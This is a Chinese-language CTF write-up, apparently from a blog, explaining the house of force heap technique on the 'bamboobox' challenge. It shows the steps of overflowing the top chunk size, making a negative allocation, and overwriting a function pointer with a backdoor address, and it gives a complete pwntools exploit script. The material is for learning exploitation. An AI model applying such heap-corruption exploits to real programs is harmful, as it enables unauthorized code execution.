-<p>现在我们的初步的思路就是，让程序去执行这个后门函数从而获取到flag，那么很容易就能想到我们可以使用上面我说的v4这个堆块，改变他第二个函数的指针为后门函数的地址从而让程序去执行这个后门函数,那么怎么修改呢，我们当然只能通过修改v4这个堆块来实现。</p>
-<p>可是v4这个堆块是系统自己申请的，我们无法利用菜单直接进行修改，但是我们可以通过house of force 来把v4这个堆块再次放入到top_chunk里面（为什么说<strong>再次</strong>呢，因为一般的堆块都是由top_chunk切割而来的）这样我们就可以控制v4这个堆块啦。</p>
-<p>那么具体怎么操作呢？</p>
-<p>首先我们先申请一个0x30的堆块（为了通过堆溢出来修改top_chunk的size做准备）</p>
-<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/4.png" alt="1689506951144"></p>
-<p>然后通过溢出修改top_chunk的size位为<strong>0xffffffffffffffff</strong></p>
-<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/5.png" alt="1689507156442"></p>
-<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/6.png" alt="1689507328332"></p>
-<p>接下来我们申请-0x70的堆块（依然满足修改后的if判断），这样top_chunk的指针刚好就可以到达v4堆块</p>
-<p><img src="/2023/07/16/%E5%88%9D%E6%AD%A5%E6%8E%A2%E8%AE%A8house-of-force/7.png" alt="1689507619495"></p>
-<p>最后就可以把v4再申请出来修改指针啦</p>
-<p>完整exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>,<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">ind,index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the new name of the item:&#x27;</span>,<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;aaaa&quot;</span>)<span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(-<span class="number">0x70</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x400D49</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>悄悄插一句，这个方法只能打通本地，因为这个后门是假的，打远端还得用unlink……</p>
 ]]></content>
   </entry>
 </search>
